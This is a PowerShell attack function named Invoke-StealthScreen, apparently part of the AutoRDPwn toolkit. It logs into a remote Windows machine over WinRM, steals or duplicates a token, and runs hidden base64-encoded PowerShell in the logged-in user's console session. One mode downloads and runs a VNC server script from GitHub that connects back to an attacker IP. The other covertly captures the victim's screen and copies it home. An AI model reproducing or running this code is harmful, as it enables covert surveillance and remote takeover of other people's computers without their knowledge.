function Invoke-StealthScreen {
    Param(
        [Parameter(Mandatory=$true)] [String] $Target,
        [Parameter(Mandatory=$true)] [String] $User,
        [Parameter(Mandatory=$true)] [String] $Pass,
        [String] $AttackerIP,
        [String] $Port = "5500",
        [ValidateSet('view','shot')] [String] $Mode = 'view',
        [String] $Password = "AutoRDPwn",
        [String] $Path = "C:\Windows\Temp"
    )

    $ErrorActionPreference = 'SilentlyContinue'

    if ($Mode -eq 'view' -and !$AttackerIP) {
        Write-Host "[!] -AttackerIP is required in view mode" -ForegroundColor Red ; return
    }

    $sec = ConvertTo-SecureString $Pass -AsPlainText -Force
    $cred = New-Object System.Management.Automation.PSCredential($User, $sec)
    $s = New-PSSession -ComputerName $Target -Credential $cred -Authentication Negotiate
    if (!$s) { Write-Host "[!] Could not connect to $Target over WinRM" -ForegroundColor Red ; return }

    if ($Mode -eq 'view') {
        $scriptdir = $PSScriptRoot
        if ($scriptdir) { & (Join-Path $scriptdir 'Invoke-VNCViewer.ps1') } else {
            Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/jeko1107/AutoRDPwn/master/Resources/Scripts/Invoke-VNCViewer.ps1') }
        Start-Process -FilePath "$env:TEMP\VNCViewer.exe" -ArgumentList "/listen $Port /password $Password /nohotkeys /autoacceptincoming" | Out-Null
        Write-Host "[+] Viewer listening on ${AttackerIP}:$Port, spawning server on target console session.." -ForegroundColor Blue

        $launch = "iex ((New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/jeko1107/AutoRDPwn/master/Resources/Scripts/Invoke-VNCServer.ps1')) ; Invoke-Vnc -ConType reverse -IpAddress $AttackerIP -Port $Port -Password $Password"
        $bytes = [System.Text.Encoding]::Unicode.GetBytes($launch)
        $enc = [System.Convert]::ToBase64String($bytes)
        $cmdline = "powershell.exe -nop -w hidden -e $enc"
    } else {
        $cmd = "Add-Type -AssemblyName System.Windows.Forms,System.Drawing; " +
               "New-Item -ItemType Directory -Path $Path -Force | Out-Null; " +
               "`$b = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds; " +
               "`$bmp = New-Object System.Drawing.Bitmap `$b.Width, `$b.Height; " +
               "`$g = [System.Drawing.Graphics]::FromImage(`$bmp); " +
               "`$g.CopyFromScreen(0, 0, 0, 0, `$bmp.Size); " +
               "`$bmp.Save('$Path\shota.png'); " +
               "`$g.Dispose(); `$bmp.Dispose()"
        $bytes = [System.Text.Encoding]::Unicode.GetBytes($cmd)
        $enc = [System.Convert]::ToBase64String($bytes)
        $cmdline = "powershell.exe -nop -w hidden -e $enc"
        Write-Host "[+] Capturing target console screen.." -ForegroundColor Blue
    }

    $result = invoke-command -session $s -scriptblock {
        Param($cmdline, $Path)
        $def = @'
using System;
using System.Runtime.InteropServices;
public class WTS {
    [DllImport("kernel32.dll")] public static extern UInt32 WTSGetActiveConsoleSessionId();
    [DllImport("advapi32.dll", SetLastError=true)] public static extern bool WTSQueryUserToken(UInt32 sessionId, out IntPtr Token);
    [DllImport("advapi32.dll", SetLastError=true)] public static extern bool OpenProcessToken(IntPtr ProcessHandle, uint DesiredAccess, out IntPtr TokenHandle);
    [DllImport("kernel32.dll")] public static extern IntPtr GetCurrentProcess();
    [DllImport("kernel32.dll", SetLastError=true)] public static extern bool CloseHandle(IntPtr hObject);
    [DllImport("advapi32.dll", SetLastError=true)] public static extern bool DuplicateTokenEx(IntPtr hExistingToken, uint dwDesiredAccess, IntPtr lpTokenAttributes, int ImpersonationLevel, int TokenType, out IntPtr phNewToken);
    [DllImport("kernel32.dll", SetLastError=true)] public static extern bool SetTokenInformation(IntPtr TokenHandle, int TokenInformationClass, ref uint TokenInformation, uint TokenInformationLength);
    [DllImport("advapi32.dll", SetLastError=true, CharSet=CharSet.Unicode)] public static extern bool CreateProcessAsUserW(IntPtr hToken, string lpApplicationName, string lpCommandLine, IntPtr lpProcessAttributes, IntPtr lpThreadAttributes, bool bInheritHandles, uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);
    [StructLayout(LayoutKind.Sequential, CharSet=CharSet.Unicode)] public struct STARTUPINFO {
        public int cb; public string lpReserved; public string lpDesktop; public string lpTitle;
        public int dwX; public int dwY; public int dwXSize; public int dwYSize;
        public int dwXCountChars; public int dwYCountChars; public int dwFillAttribute; public int dwFlags;
        public ushort wShowWindow; public ushort cbReserved2; public IntPtr lpReserved2;
        public IntPtr hStdInput; public IntPtr hStdOutput; public IntPtr hStdError; }
    [StructLayout(LayoutKind.Sequential)] public struct PROCESS_INFORMATION {
        public IntPtr hProcess; public IntPtr hThread; public uint dwProcessId; public uint dwThreadId; }
}
'@
        Add-Type -TypeDefinition $def -ErrorAction SilentlyContinue
        $sessId = [WTS]::WTSGetActiveConsoleSessionId()
        $tok = [IntPtr]::Zero
        $origin = 'usertoken'
        if ([WTS]::WTSQueryUserToken($sessId, [ref]$tok)) {
            $tok2 = [IntPtr]::Zero
            [WTS]::DuplicateTokenEx($tok, 0x1F01FF, [IntPtr]::Zero, 2, 1, [ref]$tok2) | Out-Null
            [WTS]::CloseHandle($tok) | Out-Null
            $tok = $tok2
        } else {
            $selfTok = [IntPtr]::Zero
            [WTS]::OpenProcessToken([WTS]::GetCurrentProcess(), 0x1F01FF, [ref]$selfTok) | Out-Null
            [WTS]::DuplicateTokenEx($selfTok, 0x1F01FF, [IntPtr]::Zero, 2, 1, [ref]$tok) | Out-Null
            $sid = $sessId
            [WTS]::SetTokenInformation($tok, 12, [ref]$sid, 4) | Out-Null
            $origin = 'systemtoken'
        }
        $si = New-Object WTS+STARTUPINFO
        $si.cb = [System.Runtime.InteropServices.Marshal]::SizeOf($si)
        $si.lpDesktop = 'WinSta0\Default'
        $pi = New-Object WTS+PROCESS_INFORMATION
        $ok = [WTS]::CreateProcessAsUserW($tok, $null, $cmdline, [IntPtr]::Zero, [IntPtr]::Zero, $false, 0x08000000, [IntPtr]::Zero, $null, [ref]$si, [ref]$pi)
        if ($ok) { "SPAWNED PID $($pi.dwProcessId) IN SESSION $sessId USING $origin" } else { "CREATE FAILED: $([Runtime.InteropServices.Marshal]::GetLastWin32Error())" }
    } -ArgumentList $cmdline, $Path
    Write-Host "[i] $result" -ForegroundColor Gray

    if ($Mode -eq 'shot') {
        Start-Sleep -Seconds 6
        $bytes = invoke-command -session $s -scriptblock {
            Param($Path) if (Test-Path "$Path\shota.png") { Get-Content "$Path\shota.png" -Encoding Byte -ReadCount 0 } else { $null }
        } -ArgumentList $Path
        if ($bytes) {
            $local = Join-Path $env:TEMP 'stealthshot.png'
            [System.IO.File]::WriteAllBytes($local, [byte[]]$bytes)
            Write-Host "[+] Screen captured: $local" -ForegroundColor Green
            Invoke-Item $local
        } else { Write-Host "[!] No screenshot arrived - check the target session state" -ForegroundColor Red }
    }
    Remove-PSSession $s
}
